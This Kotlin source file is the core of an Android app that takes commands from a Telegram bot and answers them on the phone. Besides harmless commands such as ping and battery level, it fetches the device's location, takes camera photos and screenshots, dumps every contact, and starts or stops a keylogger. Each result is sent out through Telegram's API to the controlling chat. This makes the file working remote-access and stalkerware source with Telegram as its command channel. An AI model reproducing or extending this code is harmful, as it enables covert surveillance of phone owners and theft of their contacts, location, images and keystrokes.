package com.example.telebot

import android.content.Context
import android.hardware.camera2.CameraManager
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.os.BatteryManager
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File


object TelegramBotManager {
    private const val BOT_TOKEN = ""
    private const val PREF_NAME = "TelegramPrefs"
    private const val LAST_UPDATE_ID = "last_update_id"

    private val client = OkHttpClient()

    fun startListening(context: Context) {
        CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                try {
                    val prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                    val lastUpdateId = prefs.getInt(LAST_UPDATE_ID, 0)
                    val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}"

                    val request = Request.Builder().url(url).get().build()
                    val response = client.newCall(request).execute()
                    val body = response.body?.string()
                    val json = JSONObject(body ?: "")
                    val result = json.getJSONArray("result")

                    for (i in 0 until result.length()) {
                        val update = result.getJSONObject(i)
                        val updateId = update.getInt("update_id")
                        val messageObj = update.getJSONObject("message")
                        val chatId = messageObj.getJSONObject("chat").getString("id")
                        val message = messageObj.getString("text")

                        prefs.edit().putInt(LAST_UPDATE_ID, updateId).apply()
                        handleCommand(context, chatId, message)
                    }

                } catch (e: Exception) {
                    e.printStackTrace()
                }

                delay(3000) // check every 3 seconds
            }
        }
    }

    private fun handleCommand(context: Context, chatId: String, message: String) {
        when (message.lowercase()) {
            "/start" -> sendMessage(chatId, "✅ Bot started!\nAvailable commands:\n/start\n/info\n/ping\n/battery\n/location\n/flashlight")
            "/info" -> sendMessage(chatId, "🤖 This Android device is connected to Telegram bot.")
            "/ping" -> sendMessage(chatId, "🏓 Pong!")
            "/battery" -> {
                val level = getBatteryLevel(context)
                sendMessage(chatId, "🔋 Battery Level: $level%")
            }
            "/location" -> {
                val location = getLastKnownLocation(context)
                if (location != null) {
                    sendMessage(chatId, "📍 Location:\nLatitude: ${location.latitude}\nLongitude: ${location.longitude}")
                } else {
                    sendMessage(chatId, "⚠️ Unable to fetch location. Make sure location permission is granted and GPS is enabled.")
                }
            }
            "/flashlight" -> {
                toggleFlashlight(context)
                sendMessage(chatId, "💡 Flashlight turned ON for 3 seconds.")
            }
            "/camera" -> {
                val uri = CameraHelper.capturePhoto(context)
                if (uri != null) {
                    val file = CameraHelper.getFilePathFromUri(uri)
                    sendPhoto(chatId, file)
                } else {
                    sendMessage(chatId, "⚠️ Failed to capture photo.")
                }
            }
            "/screenshot" -> {
                val screenshotFile = ScreenshotHelper.captureScreenshot(context)
                if (screenshotFile != null) {
                    sendPhoto(chatId, screenshotFile)
                } else {
                    sendMessage(chatId, "⚠️ Failed to capture screenshot.")
                }
            }
            "/contacts" -> sendAllContacts(context, chatId)

            "/keylogger_start" -> {
                KeyloggerManager.start(context)
                sendMessage(chatId, "🟢 Keylogger started.")
            }

            "/keylogger_stop" -> {
                KeyloggerManager.stop()
                KeyloggerManager.sendLog(context, chatId)
                sendMessage(chatId, "🔴 Keylogger stopped.")
            }

            "/say" -> {
                // Get text after /say command
                val textToSpeak = if (message.length > 4) message.substring(4).trim() else ""

                if (textToSpeak.isNotEmpty()) {
                    TextToSpeechHelper.speak(context, textToSpeak)
                    sendMessage(chatId, "🔊 Speaking: $textToSpeak")
                } else {
                    sendMessage(chatId, "⚠️ Please provide text to speak. Example: /say Hello world!")
                }
            }





            else -> sendMessage(chatId, "❌ Unknown command: $message\nTry /start")

        }
    }

    private fun sendMessage(chatId: String, message: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val encodedMessage = Uri.encode(message)
                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$chatId&text=$encodedMessage"
                val request = Request.Builder().url(url).get().build()
                val response = client.newCall(request).execute()
                println("Telegram response: ${response.body?.string()}")
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun getBatteryLevel(context: Context): Int {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun getLastKnownLocation(context: Context): Location? {
        return try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val providers = locationManager.getProviders(true)
            for (provider in providers.reversed()) {
                val location = locationManager.getLastKnownLocation(provider)
                if (location != null) return location
            }
            null
        } catch (e: SecurityException) {
            null
        }
    }

    @OptIn(DelicateCoroutinesApi::class)
    private fun toggleFlashlight(context: Context) {
        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList[0]
            cameraManager.setTorchMode(cameraId, true) // turn on

            GlobalScope.launch {
                delay(3000)
                cameraManager.setTorchMode(cameraId, false) // auto turn off
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun sendPhoto(chatId: String, file: File) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaTypeOrNull()))
                    .build()

                val request = Request.Builder().url(url).post(requestBody).build()
                val response = client.newCall(request).execute()
                println("📸 Photo sent: ${response.body?.string()}")
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
    private fun sendAllContacts(context: Context, chatId: String) {
        try {
            val contentResolver = context.contentResolver
            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )

            val contactsList = mutableListOf<String>()
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    val name = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val number = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
                    contactsList.add("👤 $name: $number")
                } while (cursor.moveToNext())
                cursor.close()
            }

            val chunkedMessages = contactsList.chunked(40) // Avoid Telegram's 4096-char limit
            for (chunk in chunkedMessages) {
                sendMessage(chatId, chunk.joinToString("\n"))
            }

        } catch (e: Exception) {
            e.printStackTrace()
            sendMessage(chatId, "⚠️ Failed to fetch contacts.")
        }
    }
    fun sendDocument(chatId: String, file: File) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("document", file.name, file.asRequestBody("text/plain".toMediaTypeOrNull()))
                    .build()

                val request = Request.Builder().url(url).post(requestBody).build()
                val response = client.newCall(request).execute()
                println("📄 Document sent: ${response.body?.string()}")
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }



}
